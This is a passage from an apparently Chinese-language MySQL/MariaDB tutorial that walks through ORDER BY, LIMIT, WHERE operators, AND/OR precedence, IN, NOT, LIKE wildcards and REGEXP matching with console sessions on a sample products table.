FU1 | Fuses | 3.42 || SLING | Sling | 4.49 || ANV01 | .5 ton anvil | 5.99 || OL1 | Oil can | 8.99 || ANV02 | 1 ton anvil | 9.99 || FB | Bird seed | 10.00 || TNT2 | TNT (5 sticks) | 10.00 || DTNTR | Detonator | 13.00 || ANV03 | 2 ton anvil | 14.99 || JP1000 | JetPack 1000 | 35.00 || SAFE | Safe | 50.00 || JP2000 | JetPack 2000 | 55.00 |+---------+----------------+------------+14 rows in set (0.00 sec) 重要的是理解在按多个列排序时,排序完全按所规定的顺序进行。换句话说,对于上述例子中的输出,仅在多个行具有相同的 prod_price值时才对产品按 prod_name 进行排序。如果 prod_price 列中所有的值都是唯一的,则不会按 prod_name 排序。 数据排序不限于升序排序(从 A 到 Z )。这只是默认的排序顺序,还可以使用 ORDER BY 子句以降序(从 Z 到 A )顺序排序。为了进行降序排序,必须指定 DESC 关键字。 指定排序方向 利用SELECT语句从products表中检索3个列(prod_id,prod_name,prod_price)，按价格prod_price以降序排序产品(最贵的排在最前面) 1234567891011121314151617181920MariaDB [test]&gt; select prod_id,prod_name,prod_price from products order by prod_price desc;+---------+----------------+------------+| prod_id | prod_name | prod_price |+---------+----------------+------------+| JP2000 | JetPack 2000 | 55.00 || SAFE | Safe | 50.00 || JP1000 | JetPack 1000 | 35.00 || ANV03 | 2 ton anvil | 14.99 || DTNTR | Detonator | 13.00 || TNT2 | TNT (5 sticks) | 10.00 || FB | Bird seed | 10.00 || ANV02 | 1 ton anvil | 9.99 || OL1 | Oil can | 8.99 || ANV01 | .5 ton anvil | 5.99 || SLING | Sling | 4.49 || FU1 | Fuses | 3.42 || FC | Carrots | 2.50 || TNT1 | TNT (1 stick) | 2.50 |+---------+----------------+------------+14 rows in set (0.00 sec) 但是,如果打算用多个列排序怎么办? 利用SELECT语句从products表中检索3个列(prod_id,prod_name,prod_price)，按价格prod_price以降序排序产品(最贵的排在最前面)，然后再对产品名排序prod_name 1234567891011121314151617181920MariaDB [test]&gt; select prod_id,prod_name,prod_price from products order by prod_price desc,prod_name;+---------+----------------+------------+| prod_id | prod_name | prod_price |+---------+----------------+------------+| JP2000 | JetPack 2000 | 55.00 || SAFE | Safe | 50.00 || JP1000 | JetPack 1000 | 35.00 || ANV03 | 2 ton anvil | 14.99 || DTNTR | Detonator | 13.00 || FB | Bird seed | 10.00 || TNT2 | TNT (5 sticks) | 10.00 || ANV02 | 1 ton anvil | 9.99 || OL1 | Oil can | 8.99 || ANV01 | .5 ton anvil | 5.99 || SLING | Sling | 4.49 || FU1 | Fuses | 3.42 || FC | Carrots | 2.50 || TNT1 | TNT (1 stick) | 2.50 |+---------+----------------+------------+14 rows in set (0.00 sec) 在多个列上降序排序 如果想在多个列上进行降序排序,必须对每个列指定 DESC 关键字。与 DESC 相反的关键字是 ASC ( ASCENDING ),在升序排序时可以指定它。但实际上, ASC 没有多大用处,因为升序是默认的(如果既不指定 ASC 也不指定 DESC ,则假定为 ASC )。 区分大小写和排序顺序 在对文本性的数据进行排序时,A与a相同吗?a位于B之前还是位于Z之后?这些问题不是理论问题,其答案取决于数据库如何设置。在字典(dictionary)排序顺序中, A被视为与a相同,这是MySQL(和大多数数据库管理系统)的默认行为。但是,许多数据库管理员能够在需要时改变这种行为(如果你的数据库包含大量外语字符,可能必须这样做)。这里,关键的问题是,如果确实需要改变这种排序顺序,用简单的 ORDER BY 子句做不到。你必须请求数据库管理员的帮助。 利用SELECT语句从products表中检索出最昂贵物品价格prod_price 1234567891011121314151617181920212223MariaDB [test]&gt; select prod_price from products order by prod_price desc limit 1;+------------+| prod_price |+------------+| 55.00 |+------------+1 row in set (0.00 sec)MariaDB [test]&gt; select prod_price from products order by prod_price desc limit 0,1;+------------+| prod_price |+------------+| 55.00 |+------------+1 row in set (0.00 sec)MariaDB [test]&gt; select prod_price from products order by prod_price desc limit 1 offset 0;+------------+| prod_price |+------------+| 55.00 |+------------+1 row in set (0.00 sec) ORDER BY 子句的位置 在给出 ORDER BY 子句时,应该保证它位于 FROM 子句之后。如果使用 LIMIT ,它必须位于 ORDER BY之后。使用子句的次序不对将产生错误消息。 12MariaDB [test]&gt; select prod_price from products limit 1 order by prod_price desc;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;order by prod_price desc&apos; at line 1 小结 本章学习了如何用 SELECT 语句的 ORDER BY 子句对检索出的数据进行排序。这个子句必须位于 FROM 子句之后,必须是 SELECT 语句中的最后一条子句。可根据需要,利用它在一个或多个列上对数据进行排序。 过滤数据本章将讲授如何使用 SELECT 语句的 WHERE 子句指定搜索条件。 使用 WHERE 子句 数据库表一般包含大量的数据,很少需要检索表中所有行。通常只会根据特定操作或报告的需要提取表数据的子集。只检索所需数据需要指 定 搜 索 条 件 ( search criteria ) , 搜 索 条 件 也 称 为 过 滤 条 件 ( filtercondition)。 在 SELECT 语句中,数据根据 WHERE 子句中指定的搜索条件进行过滤。WHERE 子句在表名( FROM 子句)之后给出。 从 products 表中检索两个列(prod_name,prod_price),但不返回所有行,只返回 prod_price 值为 2.50 的行。 12345678MariaDB [test]&gt; select prod_name,prod_price from products where prod_price=2.50;+---------------+------------+| prod_name | prod_price |+---------------+------------+| Carrots | 2.50 || TNT (1 stick) | 2.50 |+---------------+------------+2 rows in set (0.00 sec) SQL过滤与应用过滤 数据也可以在应用层过滤。为此目的,SQL的 SELECT 语句为客户机应用检索出超过实际所需的数据,然后客户机代码对返回数据进行循环,以提取出需要的行。 通常,这种实现并不令人满意。因此,对数据库进行了优化,以便快速有效地对数据进行过滤。让客户机应用(或开发语言)处理数据库的工作将会极大地影响应用的性能,并且使所创建的应用完全不具备可伸缩性。此外,如果在客户机上过滤数据,服务器不得不通过网络发送多余的数据,这将导致网络带宽的浪费。 WHERE 子句的位置 在同时使用 ORDER BY 和 WHERE 子句时,应该让 ORDER BY 位于 WHERE 之后,否则将会产生错误。 1234567891011MariaDB [test]&gt; select prod_name,prod_price from products where prod_name like &quot;T%&quot; order by prod_price desc;+----------------+------------+| prod_name | prod_price |+----------------+------------+| TNT (5 sticks) | 10.00 || TNT (1 stick) | 2.50 |+----------------+------------+2 rows in set (0.01 sec)MariaDB [test]&gt; select prod_name,prod_price from products order by prod_price desc where prod_name like &quot;T%&quot;;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;where prod_name like &quot;T%&quot;&apos; at line 1 WHERE 子句操作符 我们在关于相等的测试时看到了第一个 WHERE 子句,它确定一个列是否包含特定的值。MySQL支持下表列出的所有条件操作符。 操作符 说明 = 等于 &lt;&gt; 不等于 != 不等于 &lt; 小于 &lt;= 小于等于 &gt; 大于 &gt;= 大于等于 between 在指定的两个值之间 1.检查单个值 从 products 表中检索两个列(prod_name,prod_price),但不返回所有行,只返回 prod_name 的值为 Fuses 的一行。 1234567MariaDB [test]&gt; select prod_name,prod_price from products where prod_name=&apos;fuses&apos;;+-----------+------------+| prod_name | prod_price |+-----------+------------+| Fuses | 3.42 |+-----------+------------+1 row in set (0.00 sec) 检查 WHERE prod_name=&apos;fuses&apos; 语句,它返回 prod_name 的值为 Fuses 的一行。MySQL在执行匹配时默认不区分大小写,所以 fuses 与 Fuses 匹配。 列出价格小于10美元的所有产品 12345678910111213MariaDB [test]&gt; select prod_name,prod_price from products where prod_price &lt; 10;+---------------+------------+| prod_name | prod_price |+---------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || Carrots | 2.50 || Fuses | 3.42 || Oil can | 8.99 || Sling | 4.49 || TNT (1 stick) | 2.50 |+---------------+------------+7 rows in set (0.00 sec) 检索价格小于等于10美元的所有产品 123456789101112131415MariaDB [test]&gt; select prod_name,prod_price from products where prod_price &lt;= 10;+----------------+------------+| prod_name | prod_price |+----------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || Bird seed | 10.00 || Carrots | 2.50 || Fuses | 3.42 || Oil can | 8.99 || Sling | 4.49 || TNT (1 stick) | 2.50 || TNT (5 sticks) | 10.00 |+----------------+------------+9 rows in set (0.00 sec) 实践思考 12345678910111213141516171819202122232425262728293031323334353637 MariaDB [test]&gt; select prod_name,prod_price from products where prod_name &lt;= &quot;b&quot;;+--------------+------------+| prod_name | prod_price |+--------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || 2 ton anvil | 14.99 |+--------------+------------+3 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name,prod_price from products where prod_name &lt;= b;ERROR 1054 (42S22): Unknown column &apos;b&apos; in &apos;where clause&apos;MariaDB [test]&gt; select prod_name,prod_price from products where prod_name &lt; &quot;F&quot;;+--------------+------------+| prod_name | prod_price |+--------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || 2 ton anvil | 14.99 || Detonator | 13.00 || Bird seed | 10.00 || Carrots | 2.50 |+--------------+------------+6 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name,prod_price from products where prod_name &lt; &quot;f&quot;;+--------------+------------+| prod_name | prod_price |+--------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || 2 ton anvil | 14.99 || Detonator | 13.00 || Bird seed | 10.00 || Carrots | 2.50 |+--------------+------------+6 rows in set (0.00 sec) 何时使用引号 如果仔细观察上述 WHERE 子句中使用的条件,会看到有的值括在单引号内(如前面使用的 ‘fuses’ ),而有的值未括起来。单引号用来限定字符串。如果将值与串类型的列进行比较,则需要限定引号。用来与数值列进行比较的值不用引号。 2.不匹配检查 不是由供应商 1003 制造的所有产品 123456789101112131415161718192021222324252627MariaDB [test]&gt; select vend_id,prod_name from products where vend_id &lt;&gt; 1003;+---------+--------------+| vend_id | prod_name |+---------+--------------+| 1001 | .5 ton anvil || 1001 | 1 ton anvil || 1001 | 2 ton anvil || 1002 | Fuses || 1005 | JetPack 1000 || 1005 | JetPack 2000 || 1002 | Oil can |+---------+--------------+7 rows in set (0.00 sec)MariaDB [test]&gt; select vend_id,prod_name from products where vend_id != 1003;+---------+--------------+| vend_id | prod_name |+---------+--------------+| 1001 | .5 ton anvil || 1001 | 1 ton anvil || 1001 | 2 ton anvil || 1002 | Fuses || 1005 | JetPack 1000 || 1005 | JetPack 2000 || 1002 | Oil can |+---------+--------------+7 rows in set (0.00 sec) 3.范围值检查 为了检查某个范围的值,可使用 BETWEEN 操作符。其语法与其他 WHERE 子句的操作符稍有不同,因为它需要两个值,即范围的开始值和结束值。 例如, BETWEEN 操作符可用来检索价格在5美元和10美元之间或日期在指定的开始日期和结束日期之间的所有产品。 检索价格在5美元和10美元之间的所有产品 1234567891011121314151617181920212223MariaDB [test]&gt; select prod_name,prod_price from products where prod_price between 5 and 10;+----------------+------------+| prod_name | prod_price |+----------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || Bird seed | 10.00 || Oil can | 8.99 || TNT (5 sticks) | 10.00 |+----------------+------------+5 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name,prod_price from products where prod_price between 5 and 10 order by prod_price;+----------------+------------+| prod_name | prod_price |+----------------+------------+| .5 ton anvil | 5.99 || Oil can | 8.99 || 1 ton anvil | 9.99 || Bird seed | 10.00 || TNT (5 sticks) | 10.00 |+----------------+------------+5 rows in set (0.00 sec) 4.空值检查 在创建表时,表设计人员可以指定其中的列是否可以不包含值。在一个列不包含值时,称其为包含空值 NULL 。 NULL 无值(no value) 它与字段包含 0 、空字符串或仅仅包含空格不同。 检查products表中prod_price列具有 NULL 值的行 12MariaDB [test]&gt; select prod_name,prod_price from products where prod_price is null;Empty set (0.00 sec) 检查customers表中cust_email列具有 NULL 值的行 12345678MariaDB [test]&gt; select cust_name,cust_email from customers where cust_email is null;+-------------+------------+| cust_name | cust_email |+-------------+------------+| Mouse House | NULL || E Fudd | NULL |+-------------+------------+2 rows in set (0.00 sec) 检查customers表中cust_email列不具有 NULL 值的行 123456789MariaDB [test]&gt; select cust_name,cust_email from customers where cust_email is not null;+----------------+---------------------+| cust_name | cust_email |+----------------+---------------------+| Coyote Inc. | ylee@coyote.com || Wascals | rabbit@wascally.com || Yosemite Place | sam@yosemite.com |+----------------+---------------------+3 rows in set (0.00 sec) 小结 本章介绍了如何用 SELECT 语句的 WHERE 子句过滤返回的数据。我们学习了如何对相等、不相等、大于、小于、值的范围以及 NULL 值等进行测试。 数据过滤本章讲授如何组合 WHERE 子句以建立功能更强的更高级的搜索条件。我们还将学习如何使用 NOT 和 IN 操作符。 前面章节中介绍的所有 WHERE 子句在过滤数据时使用的都是单一的条件。为了进行更强的过滤控制,MySQL允许给出多个 WHERE 子句。这些子句可以两种方式使用:以 AND 子句的方式或 OR 子句的方式使用。 操作符(operator) 用来联结或改变 WHERE 子句中的子句的关键字。也称为逻辑操作符(logical operator)。 组合 WHERE 子句 AND 操作符 AND 用在 WHERE 子句中的关键字,用来指示检索满足所有给定条件的行。 检索products表由供应商 1003 制造且价格小于等于10美元的所有产品的名称和价格。 1234567891011MariaDB [test]&gt; select prod_name,prod_price from products where vend_id=1003 and prod_price &lt;= 10;+----------------+------------+| prod_name | prod_price |+----------------+------------+| Bird seed | 10.00 || Carrots | 2.50 || Sling | 4.49 || TNT (1 stick) | 2.50 || TNT (5 sticks) | 10.00 |+----------------+------------+5 rows in set (0.00 sec) OR 操作符 OR 操作符与 AND 操作符不同,它指示MySQL检索匹配任一条件的行。 检索products表由供应商 1002或1003 制造的所有产品的名称和价格。 123456789101112131415MariaDB [test]&gt; select prod_name,prod_price from products where vend_id=1002 or vend_id=1003;+----------------+------------+| prod_name | prod_price |+----------------+------------+| Detonator | 13.00 || Bird seed | 10.00 || Carrots | 2.50 || Fuses | 3.42 || Oil can | 8.99 || Safe | 50.00 || Sling | 4.49 || TNT (1 stick) | 2.50 || TNT (5 sticks) | 10.00 |+----------------+------------+9 rows in set (0.00 sec) 计算次序 WHERE 可包含任意数目的 AND 和 OR 操作符。允许两者结合以进行复杂和高级的过滤。 检索products表，列出价格为10美元(含)以上且由 1002 或 1003 制造的所有产品。 123456789101112MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id=1002 or vend_id=1003 and prod_price &gt;=10;+----------------+------------+---------+| prod_name | prod_price | vend_id |+----------------+------------+---------+| Detonator | 13.00 | 1003 || Bird seed | 10.00 | 1003 || Fuses | 3.42 | 1002 || Oil can | 8.99 | 1002 || Safe | 50.00 | 1003 || TNT (5 sticks) | 10.00 | 1003 |+----------------+------------+---------+6 rows in set (0.00 sec) 请看上面的结果。返回的行中有两行价格小于10美元,显然,返回的行未按预期的进行过滤。为什么会这样呢?原因在于计算的次序。SQL(像多数语言一样)在处理 OR 操作符前,优先处理 AND 操作符。当SQL看到上述 WHERE 子句时,它理解为由供应商 1003 制造的任何价格为10美元(含)以上的产品,或者由供应商 1002 制造的任何产品,而不管其价格如何。换句话说,由于 AND 在计算次序中优先级更高,操作符被错误地组合了。 此问题的解决方法是使用圆括号明确地分组相应的操作符。请看下面的 SELECT 语句及输出: 12345678910MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where (vend_id=1002 or vend_id=1003) and prod_price &gt;=10;+----------------+------------+---------+| prod_name | prod_price | vend_id |+----------------+------------+---------+| Detonator | 13.00 | 1003 || Bird seed | 10.00 | 1003 || Safe | 50.00 | 1003 || TNT (5 sticks) | 10.00 | 1003 |+----------------+------------+---------+4 rows in set (0.00 sec) 其他方法：12345678910MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where prod_price &gt;= 10 and vend_id=1002 or prod_price &gt;=10 and vend_id=1003 ;+----------------+------------+---------+| prod_name | prod_price | vend_id |+----------------+------------+---------+| Detonator | 13.00 | 1003 || Bird seed | 10.00 | 1003 || Safe | 50.00 | 1003 || TNT (5 sticks) | 10.00 | 1003 |+----------------+------------+---------+4 rows in set (0.00 sec) 在WHERE子句中使用圆括号 任何时候使用具有 AND 和 OR 操作符的 WHERE 子句,都应该使用圆括号明确地分组操作符。不要过分依赖默认计算次序,即使它确实是你想要的东西也是如此。使用圆括号没有什么坏处,它能消除歧义。 IN 操作符 圆括号在 WHERE 子句中还有另外一种用法。 IN 操作符用来指定条件范围,范围中的每个条件都可以进行匹配。 IN 取合法值的由逗号分隔的清单,全都括在圆括号中。 检索products表，列出由 1002 或 1003 制造的所有产品。 123456789101112131415MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id in (1002,1003);+----------------+------------+---------+| prod_name | prod_price | vend_id |+----------------+------------+---------+| Detonator | 13.00 | 1003 || Bird seed | 10.00 | 1003 || Carrots | 2.50 | 1003 || Fuses | 3.42 | 1002 || Oil can | 8.99 | 1002 || Safe | 50.00 | 1003 || Sling | 4.49 | 1003 || TNT (1 stick) | 2.50 | 1003 || TNT (5 sticks) | 10.00 | 1003 |+----------------+------------+---------+9 rows in set (0.00 sec) IN WHERE 子句中用来指定要匹配值的清单的关键字,功能与 OR相当 。 IN 操作符与 OR 相同的功能，下面一些实例完成之前的一些操作： 1234567891011121314151617181920212223242526MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id in (1002,1003) and prod_price &gt;= 10;+----------------+------------+---------+| prod_name | prod_price | vend_id |+----------------+------------+---------+| Detonator | 13.00 | 1003 || Bird seed | 10.00 | 1003 || Safe | 50.00 | 1003 || TNT (5 sticks) | 10.00 | 1003 |+----------------+------------+---------+4 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id in (1002,1003) order by prod_price;+----------------+------------+---------+| prod_name | prod_price | vend_id |+----------------+------------+---------+| Carrots | 2.50 | 1003 || TNT (1 stick) | 2.50 | 1003 || Fuses | 3.42 | 1002 || Sling | 4.49 | 1003 || Oil can | 8.99 | 1002 || Bird seed | 10.00 | 1003 || TNT (5 sticks) | 10.00 | 1003 || Detonator | 13.00 | 1003 || Safe | 50.00 | 1003 |+----------------+------------+---------+9 rows in set (0.00 sec) 为什么要使用 IN 操作符? 其优点具体如下。 在使用长的合法选项清单时, IN 操作符的语法更清楚且更直观。 在使用 IN 时,计算的次序更容易管理(因为使用的操作符更少)。 IN 操作符一般比 OR 操作符清单执行更快。 IN 的最大优点是可以包含其他 SELECT 语句,使得能够更动态地建立 WHERE 子句。之后章节将对此进行详细介绍。 NOT 操作符 WHERE 子句中的 NOT 操作符有且只有一个功能,那就是否定它之后所跟的任何条件。 NOT WHERE 子句中用来否定后跟条件的关键字。 列出除 1002和1003 之外的所有供应商制造的产品 1234567891011121314151617181920212223242526272829303132333435MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id not in (1002,1003);+--------------+------------+---------+| prod_name | prod_price | vend_id |+--------------+------------+---------+| .5 ton anvil | 5.99 | 1001 || 1 ton anvil | 9.99 | 1001 || 2 ton anvil | 14.99 | 1001 || JetPack 1000 | 35.00 | 1005 || JetPack 2000 | 55.00 | 1005 |+--------------+------------+---------+5 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id != 1002 and vend_id != 1003;+--------------+------------+---------+| prod_name | prod_price | vend_id |+--------------+------------+---------+| .5 ton anvil | 5.99 | 1001 || 1 ton anvil | 9.99 | 1001 || 2 ton anvil | 14.99 | 1001 || JetPack 1000 | 35.00 | 1005 || JetPack 2000 | 55.00 | 1005 |+--------------+------------+---------+5 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name,prod_price,vend_id from products where vend_id &lt;&gt; 1002 and vend_id &lt;&gt; 1003;+--------------+------------+---------+| prod_name | prod_price | vend_id |+--------------+------------+---------+| .5 ton anvil | 5.99 | 1001 || 1 ton anvil | 9.99 | 1001 || 2 ton anvil | 14.99 | 1001 || JetPack 1000 | 35.00 | 1005 || JetPack 2000 | 55.00 | 1005 |+--------------+------------+---------+5 rows in set (0.00 sec)为什么使用 NOT ? 对于简单的 WHERE 子句,使用 NOT 确实没有什么优势。但在更复杂的子句中, NOT 是非常有用的。 例如,在与 IN 操作符联合使用时, NOT 使找出与条件列表不匹配的行非常简单。 MySQL 中的NOT MySQL 支 持 使 用 NOT 对 IN 、 BETWEEN 和EXISTS子句取反,这与多数其他 DBMS允许使用 NOT 对各种条件取反有很大的差别。 小结 本章讲授如何用 AND 和 OR 操作符组合成 WHERE 子句,而且还讲授了如何明确地管理计算的次序,如何使用 IN 和 NOT 操作符。 用通配符进行过滤本章介绍什么是通配符、如何使用通配符以及怎样使用 LIKE 操作符进行通配搜索,以便对数据进行复杂过滤。 LIKE 操作符 前面介绍的所有操作符都是针对已知值进行过滤的。不管是匹配一个还是多个值,测试大于还是小于已知值,或者检查某个范围的值,共同点是过滤中使用的值都是已知的。但是,这种过滤方法并不是任何时候都好用。例如,怎样搜索产品名中包含文本anvil的所有产品?用简单的比较操作符肯定不行,必须使用通配符。利用通配符可创建比较特定数据的搜索模式。 通配符(wildcard) 用来匹配值的一部分的特殊字符。 搜索模式(search pattern) 由字面值、通配符或两者组合构成的搜索条件。 通配符本身实际是SQL的 WHERE 子句中有特殊含义的字符,SQL支持几种通配符(%,_)。 为在搜索子句中使用通配符,必须使用 LIKE 操作符。 LIKE 指示MySQL,后跟的搜索模式利用通配符匹配而不是直接相等匹配进行比较。 谓词 操作符何时不是操作符?答案是在它作为谓词(predi-cate)时。从技术上说, LIKE 是谓词而不是操作符。虽然最终的结果是相同的,但应该对此术语有所了解,以免在SQL文档中遇到此术语时不知道。 1.百分号( % )通配符 最常使用的通配符是百分号( % )。在搜索串中, % 表示任何字符出现任意次数。 找出所有以词 jet 起头的产品 12345678MariaDB [test]&gt; select prod_name,prod_price from products where prod_name like &quot;jet%&quot; ;+--------------+------------+| prod_name | prod_price |+--------------+------------+| JetPack 1000 | 35.00 || JetPack 2000 | 55.00 |+--------------+------------+2 rows in set (0.00 sec) 通配符可在搜索模式中任意位置使用,并且可以使用多个通配符。 找出所有包含anvil的产品 123456789MariaDB [test]&gt; select prod_name,prod_price from products where prod_name like &quot;%anvil%&quot; ;+--------------+------------+| prod_name | prod_price |+--------------+------------+| .5 ton anvil | 5.99 || 1 ton anvil | 9.99 || 2 ton anvil | 14.99 |+--------------+------------+3 rows in set (0.00 sec)通配符也可以出现在搜索模式的中间,虽然这样做不太有用。 找出以 s 起头以 e 结尾的所有产品 1234567MariaDB [test]&gt; select prod_name,prod_price from products where prod_name like &quot;s%e&quot; ;+-----------+------------+| prod_name | prod_price |+-----------+------------+| Safe | 50.00 |+-----------+------------+1 row in set (0.00 sec) 重要的是要注意到,除了一个或多个字符外, % 还能匹配0个字符。 %代表搜索模式中给定位置的0个、1个或多个字符。 注意尾空格 尾空格可能会干扰通配符匹配。例如,在保存词anvil 时 , 如 果 它 后 面 有 一 个 或 多 个 空 格 , 则 子 句 WHERE prod_name LIKE ‘%anvil’ 将不会匹配它们,因为在最后的 l后有多余的字符。解决这个问题的一个简单的办法是在搜索模式最后附加一个 % 。一个更好的办法是使用函数(之后讲解将会介绍)去掉首尾空格。 注意NULL 虽然似乎 % 通配符可以匹配任何东西,但有一个例外,即 NULL 。即使是 WHERE prod_name LIKE ‘%’ 也不能匹配用值 NULL 作为产品名的行。 2.下划线(_)通配符 另一个有用的通配符是下划线( _ )。下划线的用途与 % 一样,但下划线只匹配单个字符而不是多个字符。 找出以 开头有一位，之后是空格，然后为ton anvil的所有产品 12345678MariaDB [test]&gt; select prod_name,prod_price from products where prod_name like &quot;_ ton anvil&quot; ;+-------------+------------+| prod_name | prod_price |+-------------+------------+| 1 ton anvil | 9.99 || 2 ton anvil | 14.99 |+-------------+------------+2 rows in set (0.00 sec) 使用通配符的技巧 正如所见,MySQL的通配符很有用。但这种功能是有代价的:通配符搜索的处理一般要比前面讨论的其他搜索所花时间更长。 这里给出一些使用通配符要记住的技巧。 不要过度使用通配符。如果其他操作符能达到相同的目的,应该使用其他操作符。 在确实需要使用通配符时,除非绝对有必要,否则不要把它们用在搜索模式的开始处。把通配符置于搜索模式的开始处,搜索起来是最慢的。 仔细注意通配符的位置。如果放错地方,可能不会返回想要的数据。 总之,通配符是一种极重要和有用的搜索工具,以后我们经常会用到它。 小结 本章介绍了什么是通配符以及如何在 WHERE 子句中使用SQL通配符,并且还说明了通配符应该细心使用,不要过度使用。 用正则表达式进行搜索本章将学习如何在MySQL WHERE 子句内使用正则表达式来更好地控制数据过滤。 正则表达式介绍 前两章中的过滤例子允许用匹配、比较和通配操作符寻找数据。对于基本的过滤(或者甚至是某些不那么基本的过滤),这样就足够了。但随着过滤条件的复杂性的增加, WHERE 子句本身的复杂性也有必要增加。这也就是正则表达式变得有用的地方。正则表达式是用来匹配文本的特殊的串(字符集合)。 如果你想从一个文本文件中提取电话号码,可以使用正则表达式。如果你需要查找名字中间有数字的所有文件,可以使用一个正则表达式。如果你想在一个文本块中找到所有重复的单词,可以使用一个正则表达式。如果你想替换一个页面中的所有URL为这些URL的实际HTML链接,也可以使用一个正则表达式(对于最后这个例子,或者是两个正则表达式)。 所有种类的程序设计语言、文本编辑器、操作系统等都支持正则表达式。有见识的程序员和网络管理员已经关注作为他们技术工具重要内容的正则表达式很长时间了。正则表达式用正则表达式语言来建立,正则表达式语言是用来完成刚讨论的所有工作以及更多工作的一种特殊语言。与任意语言一样,正则表达式具有你必须学习的特殊的语法和指令。 完全覆盖正则表达式的内容超出了MySQL数据库教学的范围。虽然基础知识都在这里做了介绍,但对正则表达式更为透彻的介绍我们在前面shell课程中有。此处不再赘述。 使用MySQL正则表达式 那么,正则表达式与MySQL有何关系?已经说过,正则表达式的作用是匹配文本,将一个模式(正则表达式)与一个文本串进行比较。MySQL用 WHERE 子句对正则表达式提供了初步的支持,允许你指定正则表达式,过滤 SELECT 检索出的数据。 仅为正则表达式语言的一个子集 如果你熟悉正则表达式,需要注意:MySQL仅支持多数正则表达式实现的一个很小的子集。本章介绍MySQL支持的大多数内容。 1.基本字符匹配 产品名称中匹配1000的 1234567MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;1000&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 |+--------------+1 row in set (0.00 sec) 产品名称中匹配000的 1234567891011121314151617MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;.000&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products where prod_name like &apos;%000%&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec) LIKE 匹配整个列。如果被匹配的文本在列值中出现, LIKE 将不会找到它,相应的行也不被返回(除非使用通配符)。而 REGEXP 在列值内进行匹配,如果被匹配的文本在列值中出现, REGEXP 将会找到它,相应的行将被返回。这是一个非常重要的差别。 那么, REGEXP 能不能用来匹配整个列值(从而起与 LIKE 相同的作用)?答案是肯定的,使用 ^ 和 $ 定位符(anchor)即可 匹配不区分大小写 MySQL中的正则表达式匹配(自版本3.23.4后)不区分大小写(即,大写和小写都匹配)。 为区分大小写,可使用 BINARY 关键字,如 WHERE prod_name REGEXP BINARY &apos;JetPack .000&apos; 。 1234567891011121314151617181920MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;jetpack&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products where prod_name regexp binary &apos;jetpack&apos;;Empty set (0.00 sec)MariaDB [test]&gt; select prod_name from products where prod_name regexp binary &apos;JetPack&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec) 2.进行OR匹配 为搜索两个串之一(或者为这个串,或者为另一个串),使用 | 产品名称中匹配1000或者2000的 12345678MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;1000|2000&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec) 产品名称中匹配 1000 或 2000 或 3000 12345678MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;1000|2000|3000&apos;;+--------------+| prod_name |+--------------+| JetPack 1000 || JetPack 2000 |+--------------+2 rows in set (0.00 sec) 两个以上的 OR 条件 可以给出两个以上的 OR 条件。 3.匹配几个字符之一 匹配任何单一字符。但是,如果你只想匹配特定的字符,怎么办?可通过指定一组用 [ 和 ] 括起来的字符来完成 产品名称中匹配 1 或 2 或 3后面空格ton 1234567891011121314151617181920212223242526MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[123] ton&apos;;+-------------+| prod_name |+-------------+| 1 ton anvil || 2 ton anvil |+-------------+2 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[1|2|3] ton&apos;;+-------------+| prod_name |+-------------+| 1 ton anvil || 2 ton anvil |+-------------+2 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[1,2,3] ton&apos;;+-------------+| prod_name |+-------------+| 1 ton anvil || 2 ton anvil |+-------------+2 rows in set (0.00 sec) 4.匹配范围 集合可用来定义要匹配的一个或多个字符。例如,下面的集合将匹配数字0到9:[0123456789] 为简化这种类型的集合,可使用 - 来定义一个范围。 下面的式子功能上等同于上述数字列表: 范围不限于完整的集合, [1-3] 和 [6-9] 也是合法的范围。 此外,范围不一定只是数值的, [a-z] 匹配任意字母字符。 匹配 1 到 5 后面空格接ton 123456789MariaDB [test]&gt; select prod_name from products where prod_name regexp &apos;[1-5] ton&apos;;+--------------+| prod_name |+--------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil |+--------------+3 rows in set (0.00 sec) 5.匹配特殊字符 正则表达式语言由具有特定含义的特殊字符构成。 我们已经看到 . 、[] 、| 和 - 等,还有其他一些字符。请问,如果你需要匹配这些字符,应该怎么办呢? 例如,如果要找出包含 . 